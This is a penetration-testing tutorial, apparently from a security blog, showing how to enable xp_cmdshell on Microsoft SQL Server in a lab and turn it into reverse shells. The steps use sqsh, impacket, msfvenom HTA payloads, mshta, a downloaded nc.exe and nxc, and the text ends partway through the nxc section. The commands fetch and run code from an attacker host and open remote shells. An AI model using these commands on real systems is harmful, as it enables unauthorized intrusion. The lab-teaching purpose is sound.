<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ms-sql-penetration-testing/" rel="category tag">MS-SQL Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">MSSQL for Pentester: Command Execution with xp_cmdshell</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-xp_cmdshell/" rel="bookmark"><time class="entry-date published" datetime="2024-07-05T20:35:39+00:00">July 5, 2024</time><time class="updated" datetime="2025-06-19T13:23:19+00:00">June 19, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000"><strong data-start="342" data-end="375">xp_cmdshell command execution</strong> is a powerful technique available to penetration testers targeting <strong data-start="443" data-end="467">Microsoft SQL Server</strong> environments. <strong data-start="464" data-end="477">Microsoft</strong> introduced <strong data-start="489" data-end="506">xp_cmdshell</strong> with <strong data-start="512" data-end="523">T-SQL</strong> in <strong data-start="527" data-end="552">SQL Server 6.0 (1995)</strong> as part of the extended stored procedures, allowing users to execute <strong data-start="622" data-end="651">operating system commands</strong> directly from <strong data-start="666" data-end="680">SQL Server</strong>. <strong data-start="682" data-end="708">Transact-SQL (T-SQL)</strong>, the extended version of SQL used by <strong data-start="746" data-end="759">Microsoft</strong>, supports this feature through procedural programming constructs, control-of-flow statements, and additional built-in functions.<br/>
</span></p>
<div class="relative flex min-h-[calc(2rem+theme(spacing[3.5])*2)] min-w-[60px] flex-col gap-2 break-words rounded-2xl border border-gray-100 bg-gradient-to-br from-gray-50 px-5 py-3.5 text-gray-600 prose-pre:my-2 dark:border-gray-800 dark:from-gray-800/40 dark:text-gray-300">
<div>
<div class="prose max-w-none dark:prose-invert max-sm:prose-sm prose-headings:font-semibold prose-h1:text-lg prose-h2:text-base prose-h3:text-base prose-pre:bg-gray-800 dark:prose-pre:bg-gray-900">
<p><span style="color: #000000">We will now dive into the details of <strong>xp_cmdshell</strong> and explore how to utilize it for <strong>command execution</strong>. Additionally, we will discuss the different methods of enabling <strong>xp_cmdshell</strong>, including using the <strong>GUI, sqsh, and impacket-mssqlclient.</strong></span></p>
</div>
</div>
</div>
<h3><span style="color: #800000">Table of Contents</span></h3>
<ul>
<li><strong><span style="color: #000000">Lab Setup</span></strong></li>
<li><strong><span style="color: #000000">Enabling xp_cmdshell (Using GUI)</span></strong></li>
<li><strong><span style="color: #000000">Enabling xp_cmdshell (Using sqsh)</span></strong></li>
<li><strong><span style="color: #000000">Enabling xp_cmdshell (Using impacket-mssqlclient)</span></strong></li>
<li><strong><span style="color: #000000">Exploiting MSSQL (Reverse shell)</span></strong></li>
<li><strong><span style="color: #000000">Reverse shell using reverse shell generator</span></strong></li>
<li><strong><span style="color: #000000">Reverse shell using .hta file</span></strong></li>
<li><strong><span style="color: #000000">Reverse shell using netcat binary</span></strong></li>
<li><strong><span style="color: #000000">Reverse shell using python script</span></strong></li>
<li><strong><span style="color: #000000">Reverse shell using nxc</span></strong></li>
<li><strong><span style="color: #000000">Reverse shell using crackmapexec and metasploit</span></strong></li>
<li><strong><span style="color: #000000">Command execution using PowerUPSQL</span></strong></li>
<li><strong><span style="color: #000000">Conclusion</span></strong></li>
</ul>
<h3><span style="color: #800000">Lab Setup</span></h3>
<p><span style="color: #000000">Target Machine: Windows (MSSQL Server) (192.168.31.126)</span></p>
<p><span style="color: #000000">Attacker Machine: Kali Linux (192.168.31.141)</span></p>
<p><span style="color: #000000">Setup of MSSQL server can be done using the steps given at this link: <span style="color: #0000ff"><a style="color: #0000ff" href="https://www.hackingarticles.in/penetration-testing-lab-setupms-sql/">https://www.hackingarticles.in/penetration-testing-lab-setupms-sql/</a></span></span></p>
<h3><span style="color: #800000">Enabling xp_cmdshell (Using GUI)</span></h3>
<p><span style="color: #000000">After the setup is complete, we can proceed with the steps to enable <strong data-start="963" data-end="980">xp_cmdshell</strong>. By default, <strong data-start="994" data-end="1011">xp_cmdshell</strong> remains disabled in <strong data-start="1032" data-end="1050">MSSQL Server</strong> and requires administrative privileges to enable. In this case, we will use the SA user, who has administrative privileges. This account holds the highest level of permissions within the <strong data-start="1244" data-end="1260">SQL Server</strong> environment and belongs to the <strong>sysadmin</strong> fixed server role.</span></p>
<p><span style="color: #000000">Starting with the login into MSSQL server using the <strong>SA</strong> account.</span></p>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg3Yv10b1N1_-ei7LxPdNsupxyYyK_CECPMF3oCZB0frS4sejdIjCuUBjlcVjUcz3hp9b9Biv-93vva1sqopGTCWqRyQy6BiL0F0JowUk7qlXflawJ5BABYjij1RSjEyqk260_ik3VU4ZeZy6xR7qSjIqthWHG16T0ZYbU-YVKZfrZxdQnlNKLl6_DFJAoY/s16000/1.png"/></span></p>
<p><span style="color: #000000">Once the SQL instance runs with Administrator privileges, we can access <strong data-start="1399" data-end="1409">Facets</strong> by right-clicking on the instance. In <strong data-start="1448" data-end="1474">Microsoft SQL Server</strong>, <strong data-start="1476" data-end="1486">Facets</strong> form a core part of the <strong data-start="1511" data-end="1544">Policy-Based Management (PBM)</strong> framework. They include logical properties that can be configured to enforce specific policies on SQL Server instances.</span></p>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPHCSIkbo2jid1CThdO1aYeL1Qc89uSnX2YSkc7kZXfw_Tc5xq_k0zpzziYU8nX5RS7Te8Ye-TN1ri9P1FR-rYEmTt8xyFOs0j_-q1apogGu2Q7mWCAxZ-VRB_od86t_IY7XlhuY-hNzmATlq9b_DV8GPJM04ffzall2osWZ0IGaAMnvHYgHKcARZCPz6o/s16000/2.png"/></span></p>
<p><span style="color: #000000">Next, after clicking on <strong data-start="1694" data-end="1704">Facets</strong>, a new window appears. In that window, select <strong data-start="1751" data-end="1781">Surface Area Configuration</strong>. <strong data-start="1783" data-end="1815">Surface Area Configuration</strong> refers to a group of logical properties that administrators can manage to control the configuration and feature availability of <strong data-start="1944" data-end="1958">SQL Server</strong> instances.</span></p>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEieF8Y0G3sNKEyuwyRX4lpjLi6gCvO1RKA574jkl6RTy3iU0iqkl1jgEXAv2Gu8G_EYIlpZkQ1_NQ0O34bLn3Sd70CJupqhX9KGxRVQDEQGa_RjKT01V1R-XtTLB2ZafcjgG7seR8YYGOV9CY9zvuRqeAt6GdCFAFJKfk5-cG6CbzjS0OKg0nDl4WbxthZ7/s16000/3.png"/></span></p>
<p><span style="color: #000000">Inside the <strong data-start="384" data-end="425">Surface Area Configuration</strong>, we find the option for <strong data-start="450" data-end="467">xp_cmdshell</strong>, which is set to False by default. Notably, <strong data-start="514" data-end="531">xp_cmdshell</strong> creates a <strong data-start="542" data-end="561">Windows process</strong> that inherits the same <strong data-start="585" data-end="604">security rights</strong> as the <strong data-start="612" data-end="634">SQL Server service</strong>.</span></p>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgRsJ28uhhesDCa7PUSftQUEHSEX2NUKqY7avfoyHbdbdwlRZOKZsRU3YaKv_p68IYTlhQwu_DgqgpaIituBLGOy-hePPhIcPnZncGRR9uKgipiOkE7hXSE_Fjud_nXCVpTYzrlUT12_V9FmzdQAdOVtAS9gh6L_q8LW5R1BZNBrKJMQkNjm-v9gmJCJH7_/s16000/4.png"/></span></p>
<p><span style="color: #000000">To enable the feature, set <strong data-start="668" data-end="685">xp_cmdshell</strong> to <code data-start="689" data-end="695">True</code>.</span></p>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiIDNvnazM66vXcaO5IrcGWPAsRVTMynTKiGCcLDNFcXCGwX9N3357mk1AvspDYSk-pscGQLF6cUBfTZWIBX7hIU8CGYtDhFVIlL4pCrDTuBxqfuJOktU8MbVDyDxjE-BdeTPPLVMVFpa98LZA0OHSmPr4wvjezPO0maEvBgGXu84ZvwF7hqr5xt4eaBzaN/s16000/5.png"/></span></p>
<p><span style="color: #000000">However, by default, xp_cmdshell remains disabled in MSSQL Server and requires administrative privileges to enable. Therefore, we will use the sp_configure stored procedure to enable xp_cmdshell via sqsh.</span></p>
<h3><span style="color: #800000">Enabling xp_cmdshell (Using sqsh)</span></h3>
<p><span style="color: #000000"><strong>sqsh</strong> is an inbuilt tool in kali linux. Here, we are going to check if <strong>xp_cmdshell</strong> is enabled on the target machine or not. But first we will connect to the MSSQL server using the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sqsh -S 192.168.31.126 -U sa -P "Password@123"</pre>
<p><span style="color: #000000">After establishing the connection, execute the following command to verify whether <strong data-start="785" data-end="802">xp_cmdshell</strong> is enabled:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">xp_cmdshell 'whoami' ;
go</pre>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhhYeCTEs1yvdEvvKmEWLKzY4Re7bPnowt03_7AGmrnx3BCpDCkNXl0qnxz7VZshb-b_NJ66WwoR0IQZEXZRKhUqNo30SZst_Er5f8Uopp6TY7HjLSU0otbU-j_ZGVv3zhAj2D4nFkFzfVze5OMWYERuF90NVL0N0RbKF5w7oHJ5dWAor5DJrYZ9jVNm5D7/s16000/7.png"/></span></p>
<p><span style="color: #000000">At this point, we notice that the server has blocked access to the <strong data-start="2042" data-end="2069">command shell procedure</strong>. Therefore, we will use thesp_configure stored procedure. <strong data-start="2131" data-end="2149">sp_configure</strong> is a system procedure in <strong data-start="2175" data-end="2201">Microsoft SQL Server</strong> used to view or modify server-level settings. To enable <strong data-start="2258" data-end="2275">xp_cmdshell</strong> via <strong>sqsh,</strong> we need to execute the following commands in sequence:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">EXEC sp_configure 'show advanced options', 1;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
go
xp_cmdshell 'whoami';
go</pre>
<p><span style="color: #000000"><img fetchpriority="high" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgAiSMz9k3o9trhyphenhypheny_BWYZ6WvVGH5eSeRp6xN_eBiyfWWkBHePGs3Dy7TEOnsMDg9XVNc4r278_BUks0UrUYZhPvhOBMmDxYLip1gpty52JuutNiZN1aPwYdFgpBNzfVBsOA_miyBfwgsVQqO63MfGTrhrdsuFCvM0DkNi4HNFWAcmRy13HMUxeFoLSPFwy/s16000/8.png" alt="xp_cmdshell command execution" width="940" height="946"/></span></p>
<p><span style="color: #000000">In addition to sqsh, we can also use impacket-mssqlclient to enable xp_cmdshell. Meanwhile, we will use the Windows authentication method to authenticate as the raj user.</span></p>
<h3><span style="color: #800000">Enabling xp_cmdshell (Using impacket-mssqlclient)</span></h3>
<p><span style="color: #000000">In the recent version of Microsoft MSSQL Server there are primarily 3 ways to authenticate:</span></p>
<ul>
<li><span style="color: #000000">Windows authentication</span></li>
<li><span style="color: #000000">Microsoft Entra ID authentication</span></li>
<li><span style="color: #000000">SQL Server authentication</span></li>
</ul>
<p><span style="color: #000000">Here we are going to authenticate using the <strong>Windows authentication</strong> method as <strong>raj</strong> user.</span></p>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgBmBKiuRtkaszmFVOPbhVLFkV2qH6mY96wOYG1ohc_S7-FxdRfcNY374H-xcR6EFsnvo3AeyWPc6R93AtjIPpzyEtYnFWSQMWSAbnCoM0eInxOxyQviwG2tDtfix5oUFqByh-herw0hk7gjQh_qKi6aJpKXj68KHYAZ3ADsAkBjeyPq0PVgXAZbRt_ea5-/s16000/9.png"/></span></p>
<p><span style="color: #000000">Additionally, we can use the impacket-mssqlclient script to login to the system, and specifically, we use the following command for Windows authentication using the impacket-mssqlclient script.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-mssqlclient raj:'Password@1'@192.168.31.126 -windows-auth</pre>
<p><span style="color: #000000">To enable the xp_cmdshell after login, use the following commands:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">enable_xp_cmdshell
xp_cmdshell whoami</pre>
<p><span style="color: #000000"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjjsopnrujNX1eMDb3bakm8ZHmgevGP0TyfIt_jxf6eRO-J9BC-KSx6RPA4_ipBAGIFOH81iLeVvJvS1004en7R6VUmyebz-Ll3ICLoOz6AerjcP6aPJVrrjX8SqLcmuBVs5r8cYhn9xQTTBT56APlHpxX9BF8KvC0sl8lylxf86y2Eya905fiyBA7v9YHZ/s16000/30.png" alt="xp_cmdshell command execution" width="1170" height="1359"/></span></p>
<p><span style="color: #000000">Next, we will discuss the different methods of exploiting MSSQL, including using a reverse shell generator,.hta file, netcat binary, python script, nxc, and crackmapexec and metasploit. Additionally, we will use PowerUPSQL to execute commands on the target system.</span></p>
<h2><span style="color: #800000">Exploiting MSSQL (Reverse shell)</span></h2>
<p><span style="color: #000000">There are several ways to exploit an <strong data-start="857" data-end="875">MSSQL Server</strong>. These include a direct <strong data-start="900" data-end="919">reverse shell</strong> via command execution, exploitation using <strong data-start="962" data-end="978">Metasploit</strong>, or leveraging a <strong data-start="996" data-end="1030">reverse shell generator script</strong>. In this section, we will discuss each method in detail.</span></p>
<h3><span style="color: #800000">Reverse shell using reverse shell generator</span></h3>
<p><span style="color: #000000">One common technique is to use a <strong data-start="1126" data-end="1151">reverse shell command</strong> directly within the <strong data-start="1172" data-end="1189">xp_cmdshell</strong>. You can copy the required payload from this location: <span style="color: #0000ff"><a style="color: #0000ff" href="https://www.revshells.com/">https://www.revshells.com/</a></span></span></p>
<p><span style="color: #000000">Meanwhile, we can start a listener at port <strong>4444</strong> on the <strong data-start="2405" data-end="2421">Kali machine</strong> and copy the <strong data-start="2435" data-end="2465">PowerShell encoded payload</strong> into <strong data-start="2471" data-end="2488">xp_cmdshell</strong>. Here, we are using the <strong data-start="2513" data-end="2539">PowerShell #3 (Base64)</strong> payload.</span></p>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjuhSsoyZxgeqeBv6knNpn-sivZdVcRXyidYX2p3AQ_CfRGYUpr1MOHtk_RNveZkwScuHR41VPwiZx_swV5rC__wK5PRpWBDOrUXhMW9chuD2TfQ0oSa4B8fkvVMclO7k4-nW7ZZdOQ94kNHarKHds_RNfunMkAAY47MtjJrF19Ar4-mzlLXA572aBpS_QB/s16000/31.png"/></span></p>
<p><span style="color: #000000">Next, paste the entire payload after the <strong data-start="1291" data-end="1308">xp_cmdshell</strong> command within the shell.</span></p>
<p><span style="color: #000000"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgZFOa48Gwdgk7NvEiR9Clh2HeAJXCEaNjhDQuiNPtMCBczvBuD_gmPvpoZnAqgPxvaZDKjy-2aDg66vCo6yPEjCRD3g2r48ckfHJOBULsuIlvqUTkw80n8r1I_2ROsC5LU1EbY8PmqH4jp5qyQsn7HBmIPOQDsEEpzpizPwdLLTg8wTmV_lrz_wDZOVi_0/s16000/32.png" alt="xp_cmdshell command execution" width="1654" height="249"/></span></p>
<p><span style="color: #000000">Observe that once the <strong data-start="1336" data-end="1378">payload executes</strong> via<strong data-start="1383" data-end="1400">xp_cmdshell</strong>, a <strong data-start="1404" data-end="1432">reverse shell connection</strong> is successfully established on port 4444.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">rlwrap nc -lvnp 4444</pre>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi1El8eZKtEwDRRsXpvuYb3gSTL_gxyRQCFtKpfUljozE4DjoUxsW814n8X9HYqrbQ0gvTyCNHfMN_RzDh3n6f5CvloXDb_M58RKv9WqHagVrjO1Oo_vv-cp157r7yhbRYifCEAQrEXAgs0yfMayoKvTIVBUYQzjESf9P8BWjDIP_s09quQy4FAYYVt_vh4/s16000/33.png"/></span></p>
<h3><span style="color: #800000">Reverse shell using .hta file</span></h3>
<p><span style="color: #000000">The <strong>.hta</strong> (HTML Application) file is a standalone script-based program created with HTML and executed using <strong data-start="2676" data-end="2723">mshta.exe (Microsoft HTML Application Host)</strong>.. In the context of <strong data-start="2743" data-end="2760">xp_cmdshell</strong> in <strong data-start="2764" data-end="2778">SQL Server</strong>, an .hta file can execute scripts or commands by leveraging VBScript, JavaScript, or other HTML-based technologies.<br/>
</span></p>
<p><span style="color: #000000">We can generate the <strong>.hta</strong><strong data-start="2898" data-end="2933"> file</strong> using the <strong>msfvenom</strong> tool in <strong data-start="2963" data-end="2977">Kali Linux</strong>, then upload it to the target system using <strong data-start="3021" data-end="3038">xp_cmdshell</strong> to obtain a <strong data-start="3051" data-end="3068">reverse shell</strong>.</span></p>
<p><span style="color: #000000">Following will be the command for msfvenom:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/shell_reverse_tcp lhost=192.168.31.141 lport=1234 -f hta-psh &gt; shell.hta</pre>
<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEglNbCeexsLDMG4OwaxkP__oJk0zc6shu2AtUQRlBYEv-gMK4upiHof7QT2qd5k4NOXsPyDG7gLIOMVxN6SNjRflHW_YoH7l4W7HcDLCxmiPFzI8oNh7jx6hr2XtIGInqnjvHXYO58Qz4dQ974dw577ue_7vHJ3dYK4Hq7z1wUcSC2aO1CH-mitIj2tc1Rt/s16000/37.png" alt="xp_cmdshell command execution" width="1556" height="489"/></span></p>
<p><span style="color: #000000">The <strong>shell.hta</strong> file can be directly executed from the xp_cmdshell using the <strong>mshta</strong> service.</span></p>
<p><span style="color: #000000">The following command will be used in the xp_cmdshell:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">xp_cmdshell "mshta http://192.168.31.141/shell.hta"</pre>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhv07X1LnHlDKClq9L_UkDCp2hLgycRDKaLvxo11eKRIhHZH5C2u-GwDjopVKgPpOUnSlWIqSxHUwi5YzBHeZQJAu9OlYOHL7RP9R8GMiQ3nlzKUsdmxylmf2TQOdtpZdTM1yYldE7LVOlww4M0FvatFBXUrnNfj000woye4WgcDoY8gKQqR_8On-cv11Nx/s16000/38.png"/></span></p>
<p><span style="color: #000000">Observe that the reverse shell is obtained at port 1234 after running the command from xp_cmdshell.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">rlwrap nc -lvnp 1234</pre>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEia4Q_FvpZWG3_GsVhfqzzgjhmo3JFMVuKAjFhvmkBoElXHCpjVz547MDZWf3xgPx76FKvevvMDHlli2T9ig-6okk70r6W2CZnmEcjPoiGmVbwefSJUcQLdNydiftwdYrT4FEy64KtAxKRHZWyc2VoGEzxM1tT7LL5u6VrhAgzg0RrwI_S6FqctcFK6Pa6Y/s16000/39.png"/></span></p>
<h3><span style="color: #800000">Reverse shell using netcat binary</span></h3>
<p><span style="color: #000000"><strong data-start="3088" data-end="3102">Kali Linux</strong> provides built-in <strong data-start="3121" data-end="3152">Windows-compatible binaries</strong>. One such binary is <code data-start="3173" data-end="3181">nc.exe</code> (<strong data-start="3183" data-end="3193">Netcat</strong>), located at <code data-start="3207" data-end="3236">/usr/share/windows-binaries</code>. We can upload the <code data-start="3256" data-end="3264">nc.exe</code> file to the target system using <strong data-start="3297" data-end="3314">xp_cmdshell</strong>.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /usr/share/windows-binaries
ls -al
updog -p 80</pre>
<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgIL_k45B0LHq9pRPeQnK_wVbXFCUV-H7C3vlRYfhptjBBATq5GvtFhRm8OFG4h-32AtQp0-qZT3ob0EsDh4XqjUzKvRkv1mEE1yaac8HYuPJ7CbtueZstxxmgSrRvX5MTBpHUyi4dNdD4CsbThGJDhGWhI4uXx5BRdwTq9cDKfk56gI_bnKeeymWtwfvPU/s16000/45.png" alt="xp_cmdshell command execution" width="959" height="923"/></span></p>
<p><span style="color: #000000">The following commands can be run inside the xp_cmdshell to upload the nc.exe binary in the target system and then execute the binary to get a reverse shell.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">xp_cmdshell "powershell wget http://192.168.31.141/nc.exe -OutFile c:\UsersPublic\nc.exe"
xp_cmdshell  "c:\UsersPublic\nc.exe -e cmd.exe 192.168.31.141 8888"</pre>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjDe_Tz6zEXjymG49M41PMkNq-GnutAolR9V6LYVpsvYkWnXyVmwXBe2sVZrPMKNyxJQf40mqEkwRNCxafIW1JNWSEFGt8qvZn2lhJYgIEOCLQd1ozGUrrIpbwBkVwaE6642sTuXPMDZ8IipWmo2BWHdTzRcWULQuKkt4H-FSfUEGl7clOmQEQjsHuXNc3T/s16000/46.png"/></span></p>
<p><span style="color: #000000">Observe that the reverse shell is obtained at the port 8888 in the kali machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">rlwrap nc -lvnp 8888</pre>
<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgzllxIS2gl6_VBB22o1gXSfdyc4Ff4UzY0cfcZLJp2q5GEKASPjo2ypNzFeV9gtbqO0A74nxMHGSeywEH4vwdtYSPpurPc8T5BPBEtlPmRyKDVq-dJ1MHIuV-MyTTXs2LVhG7rSdXGDVMDLOY2qOSUwGusSJ818BC_q1JBchQGeedTsxFnKsVlT-2ep_Dh/s16000/47.png" alt="xp_cmdshell command execution" width="994" height="271"/></span></p>
<h3><span style="color: #800000">Reverse shell using python script</span></h3>
<p><span style="color: #000000">Alternatively, a <strong data-start="1499" data-end="1516">Python script</strong> can generate the <strong data-start="1534" data-end="1553">reverse shell</strong> payload. This payload can be used within <strong data-start="1595" data-end="1612">xp_cmdshell</strong> to establish a reverse shell connection. You can download the script from here:</span></p>
<p><span style="color: #0000ff"><a style="color: #0000ff" href="https://gist.github.com/tothi/ab288fb523a4b32b51a53e542d40fe58">https://gist.github.com/tothi/ab288fb523a4b32b51a53e542d40fe58</a></span></p>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiDHhtQwTawMCVuB4GpN6qaeo1GF0qRDSVH7LSrlCL3aYZ3MdbjEnHgFkw7DWm3Ip351a5RHUax_ZELCPvRd8IE7CynapL5LqhKZRDSQ7ob2KQqM27z6LwCE5PMIkYHlOAI9LlFF1zhnzU_eXrOmqJtbrAZzSzBUeFzt4PNm53XTFtwlcmvKR1T0z7l96oH/s16000/50.png"/></span></p>
<p><span style="color: #000000">The script requires two arguments — the attacker’s IP address and the listener’s port number. Use the following command to generate the payload with the <strong data-start="1851" data-end="1868">Python script</strong>:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 mkpsrevshell.py 192.168.31.141 9999</pre>
<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhcUYmul4XE-Kr1_qFjhFhstlcUdNBfNU8u2Mp8iZKlDWeYidScwH-CfKOxNUQWzm9YBS_s4zRiupsYUEAXKJ7ac7fmzpBMmLiLvBuRah3ZQIQcbhI7AMrTA0Hi0nQJjS3Kj_VQq2StSN2tDUU7dnbuB37FpWeeHF1mwMV7dR04LJoKZ-dQ36VVyBMDWo-C/s16000/51.png" alt="xp_cmdshell command execution" width="1080" height="263"/></span></p>
<div class="relative flex min-h-[calc(2rem+theme(spacing[3.5])*2)] min-w-[60px] flex-col gap-2 break-words rounded-2xl border border-gray-100 bg-gradient-to-br from-gray-50 px-5 py-3.5 text-gray-600 prose-pre:my-2 dark:border-gray-800 dark:from-gray-800/40 dark:text-gray-300">
<div>
<div class="prose max-w-none dark:prose-invert max-sm:prose-sm prose-headings:font-semibold prose-h1:text-lg prose-h2:text-base prose-h3:text-base prose-pre:bg-gray-800 dark:prose-pre:bg-gray-900">
<p><span style="color: #000000">Meanwhile, we use the output generated from the script directly in the xp_cmdshell to obtain a reverse shell at port 9999.</span></p>
</div>
</div>
</div>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgvHiJCzIgv_UIaf33SRgQij6KPWWGvdxrL6vobTjD7ELl9tb53t3QPUy-yvoWN8YwdrNYz5N2pLMbqBfcLSAwshiDpqeOH2S-CVEl_qbOX5sektku-kfVOgtFBGV8Vwm870cCZSBjHbm-3Fjj9U_RQwMW6hSisFXPMuDjVE1OeCurY636HM9bASirXvqsr/s16000/52.png"/></span></p>
<p><span style="color: #000000">The reverse shell is obtained after the execution of the command in the xp_cmdshell.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">rlwrap nc -lvnp 9999</pre>
<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhCPH8eB1dvIVQzPIAD0mJUvbGsP6-vOIbO-nsN4e0Uy387IuMoaueyFILK3f7ISwmC5hqFHdwdMSplujtXuRQiB01TSYsuHTttGiHoJOo7Q4DipaO95-QS5ZnCRD3s2eI16oLzRgq2hjKMlWc8vO_8q-8L7-it__ihvJ47cwQJi8GDta0L9kCanOIu-SGf/s16000/53.png" alt="xp_cmdshell command execution" width="1025" height="197"/></span></p>
<h3><span style="color: #800000">Reverse shell using nxc</span></h3>
<p><span style="color: #000000"><strong data-start="3331" data-end="3350">nxc (NetExec)</strong>—a successor to CrackMapExec—is a network service exploitation tool that lets users upload and download files. In this case, we will use <strong data-start="3487" data-end="3496">nxc</strong> to upload nc.exe to the target system and establish a <strong data-start="3553" data-end="3570">reverse shell</strong>.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /usr/share/windows-binaries
ls -al
nxc mssql 192.168.31.126 -u "raj" -p "Password@1" --put-file nc.exe c:\Users\Public\nc.exe</pre>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEimNVg7ls6HFcbOXw1_jTwXEenbTCmfJzDq0sWELYDPHULQWGLFbz44Oq3Pl8ccRnoEreIMVBUSRmb5AzswR_pDB77lOGkn9l6zNgUAHctGGlsE3smbOHhO3KJvsquz4HAL4SKvhQCoHft2R9mrzgb_OP2aUlDyUI3d-_D43JXBbk1KtkJBg983mGLvPZiN/s16000/60.png"/></span></p>
<p><span style="color: #000000">We use nxc to upload the nc.exe binary to the target system and execute system-level commands to establish a reverse shell.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nxc mssql 192.168.31.126 -u "raj" -p "Password@1" -x "c:\Users\Public\nc.exe -e cmd.exe 192.168.31.141 6666"</pre>
<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgewk1zzMfZkTTftofqcj-GXQhvJcgk-Auhcdf2dw9QkJ9JrMgk2hKj4JKDU5CdQbxLUfxXhTvmC-AuPrHuY2iEuNVFW-yFXrpBPoV9qvnn12ake3tr4G6Y8nPxZ0yn0URYL7g3lgY0jBCP-JYPdVIZxKif0Rz3nXFVder0GTn5Wby-APlmSFtQe4rR892A/s16000/61.png" alt="xp_cmdshell command execution" width="1812" height="195"/></span></p>
<p><span style="color: #000000">Meanwhile, we obtain the reverse shell on port 6666 on the Kali machine, and as a result, we can access the system remotely.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">rlwrap nc -lvnp 6666</pre>
